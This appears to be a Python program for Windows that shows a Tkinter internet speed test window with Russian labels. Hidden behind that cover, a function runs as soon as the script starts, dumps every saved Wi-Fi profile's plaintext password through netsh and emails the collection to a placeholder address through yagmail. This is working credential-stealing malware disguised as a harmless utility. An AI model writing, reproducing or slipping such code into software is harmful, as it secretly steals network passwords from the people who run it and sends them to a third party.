#This script works only with windows OS
import subprocess
import yagmail
from tkinter import *
from speedtest import Speedtest
import re

#Function for getting all networks name and passwords
def wi_fi():
    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split('\n')
    profiles = []
    data = {}
    password = []
    for profile in profiles_data:
        profile = profile.lstrip()
        if profile.startswith('All User Profile') or profile.startswith('Все профили пользователей'):
            i = (profile.split(':')[1].lstrip().rstrip())
            profiles.append(i)

    for profile in profiles:
        profile_info = subprocess.check_output(f'netsh wlan show profile name=\"{profile}\" key=clear').decode('CP866').split('\n')

        if re.findall("Содержимое ключа", str(profile_info)) == []:
            if re.findall("Key content", str(profile_info)) == []:
                    password.append('empty')
        try:
            for i in profile_info:
                if 'Содержимое ключа' in i:
                    psw = i.split(':')[1].strip()
                    password.append(psw)
                if 'Key content' in i:
                    psw = i.split(':')[1].strip()
                    password.append(psw)

        except IndexError:
            return None

    for i in range(0, len(password)):
        data[profiles[i]] = password[i]

    #Sending an email
    yag = yagmail.SMTP('email', 'password')#email and password sender
    yag.send(to='email', subject='Info', contents=data)#email recipient
wi_fi()

#Function to measure internet speed
def test():
    download = Speedtest(secure=True).download()
    upload = Speedtest(secure=True).upload()
    download_speed = round(download/(10**6),2)
    upload_speed = round(upload / (10 ** 6), 2)
    download_label.config(text='Скорость загрузки:\n' + str(download_speed) + 'MbPs')
    upload_label.config(text='Скорость отдачи:\n' + str(upload_speed) + 'MbPs')

#Display
root = Tk()
root.title('Speed Test')
root.geometry('300x400')

button = Button(root, text='Нажмите чтобы начать', font=40, command=test)
button.pack(side=BOTTOM, pady = 40)

download_label = Label(root, text='Скорость загрузки:\n', font=35)
download_label.pack(pady=(50,0))
upload_label = Label(root, text='Скорость отдачи:\n', font=35)
upload_label.pack(pady=(10,0))

root.mainloop()
